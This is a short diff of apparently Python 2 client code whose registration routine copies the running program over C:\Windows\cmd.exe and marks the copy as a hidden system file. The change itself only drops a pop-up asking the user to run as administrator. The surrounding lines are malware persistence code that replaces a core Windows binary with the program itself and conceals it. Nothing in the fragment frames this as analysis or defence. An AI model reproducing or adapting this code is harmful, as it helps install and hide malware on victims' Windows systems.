@@ -202,8 +202,6 @@ class Client:
     def register(self):
         try:
             if not os.path.basename(sys.argv[0]) == "cmd.exe":
-                cmd = "msg * \"请使用管理员模式运行\"".decode('utf-8').encode('gbk')
-                os.popen(cmd)
                 cmd = "copy /y \"" + os.path.abspath(sys.argv[0]).decode('utf-8').encode('gbk') + "\" C:\Windows\cmd.exe"
                 os.popen(cmd)
                 cmd = "attrib +S +H C:\\Windows\\cmd.exe"
